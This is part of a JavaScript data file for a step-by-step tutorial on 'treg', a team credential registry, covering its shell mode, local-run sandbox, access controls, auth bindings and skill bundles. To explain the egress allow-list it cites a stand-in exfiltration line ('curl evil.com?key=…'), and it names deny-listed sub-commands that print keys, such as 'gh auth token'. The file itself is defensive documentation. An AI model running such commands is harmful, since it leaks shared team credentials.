      explain: "At the <code>(treg)</code> prompt, run a registered CLI by its normal name. The shell finds treg's shim first on <code>PATH</code> and routes the command through treg.",
      cmd: `gh --version`,
      out: `▸ gh · audit #59\ngh version 2.72.0 (2025-04-30)\nhttps://github.com/cli/cli/releases/tag/v2.72.0`,
      notice: "You typed <code>gh</code>, not <code>treg run gh</code> - and still got the audit line. Everything after the program name goes to the CLI verbatim, and its exit code is yours." },

    { part: "Part 2 · Shell mode", who: "you", title: "Non-team commands are untouched",
      explain: "An unregistered command has no shim, so the shell resolves the real program normally. Shell mode only touches the CLIs your team registered.",
      cmd: `git --version`,
      out: `git version 2.39.5 (Apple Git-154)`,
      notice: "No <code>▸ … audit</code> line - <code>git</code> ran normally. Tab-completion is also untouched: pressing Tab after <code>gh</code> runs gh's internal completion directly, so it does <b>not</b> create an audit row per keystroke." },

    { part: "Part 2 · Shell mode", who: "you", title: "Leave - everything reverts",
      explain: "<code>exit</code> (or Ctrl-D, or closing the terminal) tears the session down: the shim folder is removed and your <code>PATH</code> returns to normal.",
      cmd: `exit\nwhich gh`,
      out: `▚ treg shell closed.\n/opt/homebrew/bin/gh`,
      notice: "<code>which gh</code> points at the real binary again. Nothing is left behind." },

    { part: "Part 2 · Shell mode", who: "you", title: "Route one CLI to the server; set a time limit",
      explain: "<code>--server-for &lt;tools&gt;</code> makes those CLIs run <b>on the registry</b> (the key never touches your machine); <code>--ttl &lt;minutes&gt;</code> closes the shell automatically.",
      cmd: `treg shell start --server-for stripe --ttl 60\n# inside the shell:\nstripe --version      # runs on the server; output streamed back\nexit\ntreg runs --limit 1`,
      out: `[\n  { "tool": "stripe", "argv": ["--version"], "exit_code": 0, "duration_ms": 92, "where": "server" }\n]`,
      notice: "<code>stripe</code> is marked <code>(server)</code> in the banner and its run is logged with <code>\"where\": \"server\"</code> - it executed on the registry, not your laptop." },

    // ---- The local-run security sandbox ------------------------------------
    { part: "Part 3 · The security sandbox", who: "sys", title: "Set it up (once, as admin)",
      explain: "A local run puts a shared team key on a member's machine for the length of one command. That is only safe if the member cannot capture the key. <code>sudo treg setup-local-run</code> (Linux and macOS) builds a sandbox with three layers.",
      cmd: `sudo treg setup-local-run`,
      out: `created hidden system user 'treg-run' (uid 380)\ninstalled runner at /usr/local/bin/treg-runner\ninstalled sudoers rule for member 'you'\n  egress: pf allow-list active — treg-run may reach 95 host(s), all else dropped\n\ndone — you can now run:  treg run <tool> -- <args>   (the CLI runs as treg-run)`,
      notice: "It creates a dedicated no-login user <code>treg-run</code>, a narrow rule that lets you run <b>only</b> the treg runner as that user, and a network allow-list. From now on a local run executes as <code>treg-run</code>, not as you." },

    { part: "Part 3 · The security sandbox", who: "you", title: "Layer 1 - isolation (you can't read the key)",
      explain: "The CLI runs as <code>treg-run</code>, a different user id - a different user's process environment and memory are unreadable by you. To see it directly, run a tiny tool whose program is <code>id</code>.",
      cmd: `treg run idtool`,
      out: `▸ idtool · audit #52\nuid=380(treg-run) gid=380(treg-run) groups=380(treg-run)…`,
      notice: "The command ran as <b>uid=380(treg-run)</b>, not as you. One requirement: treg itself must be installed at a system path (e.g. <code>/usr/local/bin</code>) - treg-run, by design, cannot read into your private home directory." },

    { part: "Part 3 · The security sandbox", who: "you", title: "Layer 2 - egress allow-list",
      explain: "Even isolated, a CLI feature that runs code could try to send the key to another site. The sandbox restricts <code>treg-run</code>'s outbound network to the registry plus the tool API hosts in the catalog.",
      cmd: `sudo -u treg-run curl -s -o /dev/null -w "%{http_code}\\n" https://api.github.com/zen   # a catalog host\nsudo -u treg-run curl -s -o /dev/null -w "%{http_code}\\n" https://example.com          # anything else`,
      out: `200\n000`,
      notice: "<code>treg-run</code> reached <code>api.github.com</code> (200) but was blocked from <code>example.com</code> (000) - so a rogue plugin's <code>curl evil.com?key=…</code> delivers nothing. API IPs drift: refresh with <code>sudo treg setup-local-run --refresh-egress</code>." },

    { part: "Part 3 · The security sandbox", who: "you", title: "Layer 3 - filesystem jail",
      explain: "The last escape route is writing the key to a file you then read. The opt-in <code>--fs-jail</code> confines a run's writes to a private scratch folder only <code>treg-run</code> can read, removed after the run.",
      cmd: `treg run --fs-jail writetool -- /tmp/leak     # writetool's program is \`touch\`\nls /tmp/leak`,
      out: `touch: /tmp/leak: Operation not permitted\nls: /tmp/leak: No such file or directory`,
      notice: "The write was denied and no file was created. <code>--fs-jail</code> is opt-in because it also stops a CLI writing legitimate output files - turn it on where that trade is worth it." },

    { part: "Part 3 · The security sandbox", who: "sys", title: "Two more built-in protections",
      explain: "Always on, no setup: <b>output redaction</b> - when you run a tool whose key you don't own, treg scrubs the key's value out of the CLI's output before it reaches your screen (<code>***</code> instead). And <b>catalog deny rules</b> - catalog CLIs refuse the sub-commands that would print the key or run arbitrary code with it (<code>gh extension</code>, <code>gh auth token</code>, <code>doppler run</code>, …), enforced on the server.",
      cmd: `treg tool update stripe --local-run on     # each owner opts local runs in, per tool`,
      out: `{\n  "id": 4,\n  "name": "stripe",\n  "local_run": true\n}`,
      notice: "Local runs are <b>off by default</b> per tool - a run hands a credential to a machine, so the owner opts in. Prose version of this whole tutorial: <code>/tutorial-import-shell.md</code>." },
  ];

  // ---- Focused tutorial: Team access control ------------------------------
  // Prose twin: src/treg/web/tutorial-access.md (served at /tutorial-access.md).
  const ACCESS = [
    { part: "Setup", who: "sys", title: "Two dials, two people",
      explain: "Every member has two independent dials: <b>tool access</b> (<code>tool_access</code>: which tools they may touch - default <b>all</b>) and <b>local execution</b> (<code>local_run_enabled</code>: may they run a CLI on their own machine - default <b>on</b>). A withheld tool is closed through <i>every</i> door - proxy call, server run, local run. The <b>owner</b> is never restricted. We play two people on one machine: <b>Tom</b> (owner) and <b>Sam</b> (the new teammate we restrict).",
      cmd: `for u in tom sam; do\n  mkdir -p ~/.treg-personas/$u\n  HOME=~/.treg-personas/$u treg config --base-url https://treg.ngrok.app\ndone`,
      out: `# each persona now points at the registry`,
      notice: "Prefix a command with <code>HOME=~/.treg-personas/&lt;name&gt;</code> to act as that person. In real life each person is on their own machine and drops the prefix." },

    { part: "Part 1 · Invite with tailored access", who: "tom", title: "Invite Sam - one tool, no local runs",
      explain: "Tom invites Sam but grants access to <b>only</b> the <code>gh</code> tool and turns <b>local runs off</b>. The access travels with the invite and lands on Sam's membership the moment he accepts.",
      cmd: `HOME=~/.treg-personas/tom treg org invite sam@superdesign.dev --tools gh --local-run off`,
      out: `{\n  "code": "<one-time-invite-code>",\n  "email": "sam@superdesign.dev",\n  "role": "member",\n  "org_id": 44,\n  "expires_at": "2026-07-21T…"\n}`,
      notice: "<code>--tools gh</code> is the allow-list (comma-separated for several); <code>--local-run off</code> means server-only. <code>--all-tools</code> grants everything explicitly." },

    { part: "Part 1 · Invite with tailored access", who: "tom", title: "(Alternative) let treg ask",
      explain: "Run the invite <b>without</b> the access flags and treg asks interactively - \"give access to all tools?\" - and, on no, shows a checklist of every tool (all pre-ticked) to uncheck the ones to withhold.",
      cmd: `HOME=~/.treg-personas/tom treg org invite sam@superdesign.dev`,
      out: `Give access to all 10 tools? [Y/n]: n\n? Tools this member may use  (↑↓ move, space toggle, enter confirm)\n ◉ gh\n ◯ stripe\n ◉ gcloud\n …`,
      notice: "The checklist is the same idea as the dashboard's \"Customize\" (last step). Tick <i>every</i> tool and it collapses back to \"all\", so the member keeps auto-getting new tools." },

    { part: "Part 1 · Invite with tailored access", who: "sam", title: "Sam accepts",
      explain: "Sam proves his email (any door), then accepts. His membership is created <b>carrying</b> the access from the invite: only <code>gh</code>, no local runs.",
      cmd: `HOME=~/.treg-personas/sam treg login --email sam@superdesign.dev\nHOME=~/.treg-personas/sam treg accept superdesign`,
      out: `{\n  "org": "superdesign",\n  "org_id": 44,\n  "name": "Superdesign",\n  "role": "member"\n}`,
      notice: "Sam is a <b>member</b> - but a <i>restricted</i> one. The next part shows the walls." },

    { part: "Part 2 · The walls", who: "sam", title: "An allowed tool works",
      explain: "<code>gh</code> is on Sam's list, so calling it through the proxy is fine - the key is injected server-side; nothing lands on Sam's machine.",
      cmd: `HOME=~/.treg-personas/sam treg call gh zen`,
      out: `Keep it logically awesome.`,
      notice: "No error - Sam has access to <code>gh</code>, so the proxy serves the call normally." },

    { part: "Part 2 · The walls", who: "sam", title: "A withheld tool is blocked",
      explain: "<code>stripe</code> is <b>not</b> on Sam's list. Every door to it is closed - here, the proxy.",
      cmd: `HOME=~/.treg-personas/sam treg call stripe v1/balance`,
      out: `{\n  "detail": "you don't have access to the tool 'stripe' in this team — an admin can grant it (dashboard → Team, or \`treg org access <you> --tools …\`)"\n}`,
      notice: "The message tells Sam exactly how to get access. <code>treg run stripe</code> and <code>treg run --server stripe</code> are refused the same way - no side path." },

    { part: "Part 2 · The walls", who: "sam", title: "Local execution is off",
      explain: "<code>gh</code> is allowed, but Sam's <code>local_run_enabled</code> is <b>off</b>, so he cannot run it on his own machine. treg points him at the server tier instead.",
      cmd: `HOME=~/.treg-personas/sam treg run gh -- --version`,
      out: `treg: local execution is disabled for you — run on the server instead (\`treg run --server\`), or ask an admin to enable local runs for your account`,
      notice: "This is the <i>local</i> wall, separate from tool access - <code>treg run --server gh …</code> (the key stays on the registry) is allowed." },

    { part: "Part 2 · The walls", who: "sam", title: "A member can't manage the team",
      explain: "Access control is an admin power. Sam (a member) cannot list or change anyone's access.",
      cmd: `HOME=~/.treg-personas/sam treg org members`,
      out: `{\n  "detail": "admin role in this org is required"\n}`,
      notice: "Only admins and the owner see the roster and edit access. Sam can only be <i>given</i> access, not grant it." },

    { part: "Part 3 · Adjust later", who: "tom", title: "See everyone's access",
      explain: "The members list shows each person's <code>tool_access</code> (their allow-list, or <code>null</code> = all) and <code>local_run_enabled</code>.",
      cmd: `HOME=~/.treg-personas/tom treg org members`,
      out: `[\n  {\n    "user_id": 60,\n    "email": "tom@superdesign.dev",\n    "role": "owner",\n    "tool_access": null,\n    "local_run_enabled": true\n  },\n  {\n    "user_id": 63,\n    "email": "sam@superdesign.dev",\n    "role": "member",\n    "tool_access": ["gh"],\n    "local_run_enabled": false\n  }\n]`,
      notice: "Tom (owner) is <code>\"tool_access\": null</code> - all tools, always. Sam is <code>[\"gh\"]</code> with local off, exactly as invited." },

    { part: "Part 3 · Adjust later", who: "tom", title: "Widen Sam's access",
      explain: "Tom gives Sam <b>all</b> tools and turns local runs <b>on</b>, using Sam's <code>user_id</code> from the list.",
      cmd: `HOME=~/.treg-personas/tom treg org access 63 --all-tools --local-run on`,
      out: `{\n  "user_id": 63,\n  "org_id": 44,\n  "tool_access": null,\n  "local_run_enabled": true\n}`,
      notice: "<code>--all-tools</code> clears the list (<code>null</code> = all). A flag you <i>don't</i> pass keeps its current value - so <code>--local-run off</code> alone flips only the local dial." },

    { part: "Part 3 · Adjust later", who: "sam", title: "Sam tries again - everything works",
      explain: "The same two commands that failed before now pass: <code>stripe</code> is reachable (all tools) and <code>gh</code> runs locally (local is on).",
      cmd: `HOME=~/.treg-personas/sam treg call stripe v1/balance\nHOME=~/.treg-personas/sam treg run gh -- --version`,
      out: `{ "object": "balance", "available": [ … ] }\n▸ gh · audit #58\ngh version 2.72.0 (2025-04-30)`,
      notice: "The same two dials, opened up. Tom can pin Sam to an exact set again any time: <code>treg org access 63 --tools gh,gcloud</code>. An unknown tool name is rejected with a clear 422 - you never grant a typo." },

    { part: "Part 4 · Dashboard & API", who: "tom", title: "The same controls, point-and-click",
      explain: "Everything above is also in the dashboard → <b>Team</b>. The members table gains two cells per person - <b>Tools</b> (shows <code>All</code> or <code>N tools</code>; click for the checklist) and a <b>Local run</b> toggle. The invite box offers <b>All tools / Customize</b> + a <b>Local runs allowed</b> switch. And when you register a <i>new</i> tool while someone has a customized list, a toast reminds you they won't see it until you add it.",
      cmd: `# agents / CI drive the same two endpoints:\nPATCH /orgs/{org_id}/members/{user_id}/access\n  { "tool_access": ["gh","stripe"] | null, "local_run_enabled": true }\nGET   /orgs/{org_id}/members      # returns both fields per member`,
      out: `{\n  "user_id": 63,\n  "tool_access": ["gh", "stripe"],\n  "local_run_enabled": true\n}`,
      notice: "<code>null</code> = all tools; a list = the allow-list (validated - unknown names → 422; all tools collapses to <code>null</code>). Admin/owner only; an owner cannot be restricted. Prose version: <code>/tutorial-access.md</code>." },
  ];

  // ---- tiny self-contained highlighter (shell + json) -------------------
  const RULES = {
    shell: [
      { re: /#[^\n]*/,                     cls: "comment" },
      { re: /"(?:[^"\\]|\\.)*"/,           cls: "string"  },
      { re: /'[^']*'/,                     cls: "string"  },
      { re: /\$\((?:[^()]*)\)/,            cls: "var"     },
      { re: /\$[A-Za-z_][A-Za-z0-9_]*/,    cls: "var"     },
      { re: /HOME=\S+/,                    cls: "env"     },
      { re: /\btreg\b/,                    cls: "cmd"     },
      { re: /(?:^|\s)--?[A-Za-z][\w-]*/,   cls: "flag"    },
    ],
    json: [
      { re: /"(?:[^"\\]|\\.)*"(?=\s*:)/,   cls: "key"     },
      { re: /"(?:[^"\\]|\\.)*"/,           cls: "str"     },
      { re: /\b-?\d+(?:\.\d+)?\b/,         cls: "num"     },
      { re: /\b(?:true|false|null)\b/,     cls: "kw"      },
      { re: /#[^\n]*/,                     cls: "comment" },
      { re: /[{}\[\],:]/,                  cls: "punct"   },
    ],
  };
  function esc(t) { return t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
  function tregHL(text, lang) {
    const rules = RULES[lang];
    if (!rules) return esc(text);
    const combined = new RegExp(rules.map(r => "(" + r.re.source + ")").join("|"), "g");
    let out = "", i = 0, m;
    while ((m = combined.exec(text))) {
      if (m.index > i) out += esc(text.slice(i, m.index));
      let cls = null;
      for (let k = 0; k < rules.length; k++) { if (m[k + 1] !== undefined) { cls = rules[k].cls; break; } }
      out += `<span class="hl-${cls}">${esc(m[0])}</span>`;
      i = combined.lastIndex;
      if (combined.lastIndex === m.index) combined.lastIndex++;  // guard zero-width
    }
    out += esc(text.slice(i));
    return out;
  }
  // pick a language for an output block (json if it looks structured, else plain shell-ish)
  function tregLang(text, kind) { return kind === "cmd" ? "shell" : (/^\s*[[{]/.test(text) ? "json" : "text"); }

  const AUTH = [
    { h: "env - a static key or token",
      p: `The common case: an API key or bearer token. treg injects it via the binding's <b>format</b> - e.g. <code>Authorization: Bearer {secret}</code> in a header, or <code>?api_key={secret}</code> in the query string. Set it with <span class="mono">treg secret add stripe-key --value sk-…</span>, then bind it on a tool.` },
    { h: "oauth - auto-refreshed tokens",
      p: `For OAuth APIs (Google, GitHub…). Store the token blob (access + refresh + client id/secret); treg <b>auto-refreshes</b> the access token ~60s before it expires - single-flight, so a burst of calls triggers exactly one refresh - so your calls never hit a 401. Mint the first token via the hosted browser-consent flow: <span class="mono">treg oauth connect &lt;name&gt; --client-secret … --scopes …</span>. The refresh_token comes back and the credential lands in auto-refresh mode.` },
    { h: "secret_file - a JSON credential",
      p: `When the credential is a JSON file (a service-account, an authorized-user file…). treg pulls one field out of the blob (<span class="mono">secret_field</span>, default <code>access_token</code>) and injects it. Set it with <span class="mono">treg secret add gcp --file cred.json --kind secret_file</span>.` },
    { h: "cli_auth - from a local CLI / keychain",
      p: `A credential you'd normally get from a CLI login or the OS keychain - captured once during skill setup, then stored + injected like the rest, so a tool that usually needs a local login works through the proxy for the whole team.` },
    { h: "Bindings - where &amp; how it lands",
      p: `Every binding is <code>{ location, name, format, secret_field }</code>. <b>location</b>: <code>header</code> or <code>query</code>. <b>name</b>: the header (<code>Authorization</code>) or param (<code>api_key</code>). <b>format</b>: <code>Bearer {secret}</code>, <code>token {secret}</code>, or bare <code>{secret}</code>. A tool can carry <b>several</b> bindings (e.g. an OAuth bearer + a developer-token header) - treg applies every one on each call.` },
  ];
  const SKILLS = [
    { h: "What a skill is",
      p: `A reusable capability packaged as a folder - its <b>recipe</b>, its <b>secrets</b> and its <b>tool(s)</b> - registered as one <b>bundle</b> (and deleted as one). It's how you hand a teammate, or a <b>Claude Code</b> agent, a ready-to-call API with zero key-sharing.` },
    { h: "The folder layout",
      p: `<pre>my-skill/\n  SKILL.md     what it does - the recipe / how-to\n  .secret/     credential files (values live here; gitignore it)\n  treg.json    the contract - REFERENCES, never values</pre>` },
    { h: "treg.json - the contract",
      p: `<pre>{ "name": "my-skill",\n  "secrets": [{ "local_name": "key", "kind": "env" }],\n  "tools": [{ "name": "my-tool", "base_url": "https://api.x.com",\n             "bindings": [{ "secret": "key", "location": "header",\n                           "name": "Authorization",\n                           "format": "Bearer {secret}" }] }] }</pre>Only <code>local_name</code> references - no values. The CLI loads the real values from <span class="mono">.secret/</span> at upload.` },
    { h: "Register it",
      p: `<span class="mono">treg skill init --dir ./my-skill</span> scans <code>SKILL.md</code> + <code>.secret/</code> and drafts <code>treg.json</code> (guessing <code>base_url</code>, finding the secrets). Review it, then <span class="mono">treg skill add --dir ./my-skill</span> uploads recipe + secrets + tool <b>atomically</b>.` },
    { h: "Make it better - practices",
      p: `• One tool per real upstream; add a <b>health_check</b> so treg can validate the creds.<br>• Name secrets by purpose (<code>stripe-key</code>, not <code>key1</code>).<br>• Keep <span class="mono">.secret/</span> gitignored; commit <span class="mono">treg.json</span> (it's reference-only).<br>• Write a real SKILL.md - it's what a teammate or agent reads to use the tool.<br>• Prefer <b>oauth</b> over long-lived keys where the API supports it (auto-refresh + revocable).` },
  ];
  window.TREG_TUTORIAL = { personas: PERSONAS, concepts: CONCEPTS, roles: ROLES, auth: AUTH, skills: SKILLS, steps: STEPS,
                           importShell: IMPORT_SHELL, access: ACCESS };
  window.tregHL = tregHL;
  window.tregLang = tregLang;
})();
